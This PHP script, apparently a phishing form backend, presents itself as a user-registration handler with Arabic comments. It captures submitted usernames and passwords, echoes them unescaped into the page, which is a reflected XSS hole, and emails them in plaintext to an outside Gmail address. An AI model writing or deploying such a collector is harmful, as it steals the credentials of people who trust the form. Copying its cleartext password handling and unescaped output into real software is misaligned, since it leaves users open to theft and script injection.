<?php

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Retrieve form data
        $username = $_POST['username'];
        $password = $_POST['password'];
    
        // Print received data in a table
        echo "<h2>User Information:</h2>";
        echo "<table border='1'>";
        echo "<tr><th>Field</th><th>Value</th></tr>";
        echo "<tr><td>Username</td><td>$username</td></tr>";
        echo "<tr><td>Password</td><td>$password</td></tr>";
        echo "</table>";
    
        // Here you can proceed to validate and store the received data in your database
        // Remember to sanitize and validate user input before using it in your application

 // Prepare email message
 $to = "mysterykillh@gmail.com"; // تحديد البريد الإلكتروني الذي تريد إرسال الرسالة إليه
 $subject = "New user registration";
 $message = "Username: " . $username . "\n" . "Password: " . $password;

 // إرسال البريد الإلكتروني
 if (mail($to, $subject, $message)) {
     echo "تم إرسال البريد الإلكتروني بنجاح.";
 } else {
     echo "حدث خطأ أثناء محاولة إرسال البريد الإلكتروني.";
 }

        echo "<p>Welcome, " . htmlspecialchars($username) . "!</p>";
        
}


?>
